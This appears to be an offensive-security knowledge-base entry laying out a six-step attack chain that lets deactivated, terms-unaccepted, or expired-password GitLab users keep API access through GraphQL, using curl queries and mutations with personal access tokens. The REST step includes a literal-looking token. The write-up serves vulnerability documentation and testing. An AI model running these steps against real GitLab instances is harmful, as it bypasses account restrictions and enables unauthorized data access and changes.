---
tags:
  - gitlab
  - graphql
  - authorization-bypass
  - api-access
  - deactivated-user
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Defense Evasion]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-and-Deactivate-GitLab-User]]'
  - '[[procedures/Generate-Personal-Access-Token-for-Deactivated-User]]'
  - '[[procedures/Query-GraphQL-API-with-Deactivated-Token]]'
  - '[[procedures/Perform-GraphQL-Mutation-with-Deactivated-Token]]'
  - '[[procedures/Test-REST-API-Access-with-Deactivated-Token]]'
  - '[[procedures/Bypass-Additional-Restrictions-via-GraphQL]]'
step_count: 6
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:59.541Z'
description: >-
  Multi-stage attack demonstrating how deactivated GitLab users can bypass
  restrictions to access the GraphQL API using personal access tokens, enabling
  unauthorized data access and mutations in vulnerable versions.
skill_level: intermediate
impact_level: high
id: 6e183657-092a-4bf2-9b32-64ff5b7f039f
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# GitLab GraphQL Authorization Bypass for Deactivated Users

Multi-stage attack chain demonstrating a complete attack workflow to bypass GitLab's deactivation restrictions via the GraphQL API, allowing unauthorized read and write access to sensitive data.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create User] --> B[Deactivate User]
    B --> C[Generate Token]
    C --> D[Query GraphQL]
    D --> E[Perform Mutation]
    E --> F[Contrast with REST]
    F --> G[Bypass ToS/Expired PW]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#9b59b6
    style G fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- GitLab instance (versions <13.11.2 for mutations, any for reads)
- Admin access to GitLab
- Network access to GitLab API endpoints (/api/graphql, /api/v4)

### Initial Access Requirements

- Valid admin credentials for user management
- No prior user access needed, but target must allow token creation

## Detailed Attack Procedures

### Step 1: Create and Deactivate User
procedure: [[procedures/Create-and-Deactivate-GitLab-User]]

**Objective**: Set up a test user account and deactivate it to simulate a restricted account.

**Instructions**: Use GitLab admin panel to create a new user, then deactivate it immediately since it has no activity.

**Expected Output**: User account created and marked as deactivated in admin panel.

**Success Indicators**:
- New user appears in user list
- Deactivation status shows as inactive

### Step 2: Generate Token for Deactivated User
procedure: [[procedures/Generate-Personal-Access-Token-for-Deactivated-User]]

**Objective**: Create a personal access token for the deactivated user to enable API authentication.

**Instructions**: Access the admin impersonation tokens page and generate a token with API scope for the deactivated user.

**Expected Output**: Token string generated and copied.

**Success Indicators**:
- Token created successfully
- Token has 'api' scope

### Step 3: Query GraphQL API with Deactivated Token
procedure: [[procedures/Query-GraphQL-API-with-Deactivated-Token]]

**Objective**: Test read access to GraphQL API using the deactivated token to fetch user data.

**Instructions**: Execute [[commands/curl-graphql-currentuser-query]] to send a GraphQL query for current user ID.

```bash
curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{"query":"{\n currentUser{id}\n}"}'}'
```

**Expected Output**: JSON response with user ID, e.g., {"data":{"currentUser":{"id":"gid://gitlab/User/15"}}}.

**Success Indicators**:
- Query succeeds without errors
- User data returned despite deactivation

### Step 4: Perform GraphQL Mutation with Deactivated Token
procedure: [[procedures/Perform-GraphQL-Mutation-with-Deactivated-Token]]

**Objective**: In pre-13.11.2 versions, add the user to a project and execute a mutation to demonstrate write access.

**Instructions**: First, use admin token to add user to project with [[commands/curl-add-user-to-project]], then perform mutation with [[commands/curl-graphql-labelcreate-mutation]].

```bash
curl --header "Authorization: Bearer <<ADMIN TOKEN>>" "https://gitlab.domain.com/api/v4/projects/<PROJECT_ID>/members" --data "user_id=2&access_level=40"
```

```bash
curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Authorization: Bearer <<DEACTIVATEDTOKEN>>' --data '{"query":"mutation {\n labelCreate(input:{title:\"deactivated\", projectPath:\"test1/test1\"}){\n errors\n label{\n id\n }\n }\n}"}'}'
```

**Expected Output**: Member added successfully, then mutation creates label with ID and no errors.

**Success Indicators**:
- User added to project
- Label created via mutation

### Step 5: Test REST API Access with Deactivated Token
procedure: [[procedures/Test-REST-API-Access-with-Deactivated-Token]]

**Objective**: Verify that REST API properly enforces deactivation by returning 403.

**Instructions**: Execute [[commands/curl-rest-user-access]] to attempt REST API call.

```bash
curl --header "Authorization: Bearer jKSvxhuDN-Noag6N-w7R" "http://gitlab.joaxcar.com/api/v4/user"
```

**Expected Output**: 403 Forbidden with deactivation message.

**Success Indicators**:
- Access denied as expected
- Confirms GraphQL bypass specificity

### Step 6: Bypass Additional Restrictions via GraphQL
procedure: [[procedures/Bypass-Additional-Restrictions-via-GraphQL]]

**Objective**: Extend the bypass to users who haven't accepted ToS or have expired passwords, accessing projects and data.

**Instructions**: For ToS bypass, use [[commands/curl-graphql-tos-bypass-query]]; for expired password, use [[commands/curl-graphql-expiredpw-projects-query]]. Contrast with REST blocks using [[commands/curl-rest-tos-block]] and [[commands/curl-rest-expiredpw-block]].

**Expected Output**: Successful GraphQL queries returning user/project data; REST returns 403.

**Success Indicators**:
- Data access via GraphQL despite restrictions
- REST properly blocks

## Attack Chain Summary

### Key Achievements

1. Bypassed deactivation to read user data via GraphQL
2. Performed unauthorized mutations in older versions
3. Extended bypass to ToS and expired password restrictions, enabling broad API abuse

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Defense Evasion]] Defense Evasion
- [[Initial Access]] Initial Access

---

*Last updated: 2023-10-01T00:00:00Z*
